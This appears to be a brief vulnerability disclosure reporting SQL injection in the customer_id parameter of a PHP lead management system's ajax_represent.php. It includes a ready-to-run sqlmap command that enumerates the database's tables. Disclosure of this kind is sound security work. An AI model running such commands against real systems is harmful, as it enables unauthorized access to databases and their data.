vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $customer_id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/208409975-158d10ce-819d-4ba6-9851-73331d9496a5.png)


EXP

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/ajax_represent.php" --data "customer_id=1" --dbms=mysql -D penglead --tables
```
![image](https://user-images.githubusercontent.com/30823782/208410046-36eb9f64-0f5e-425d-927a-111864e74ff3.png)

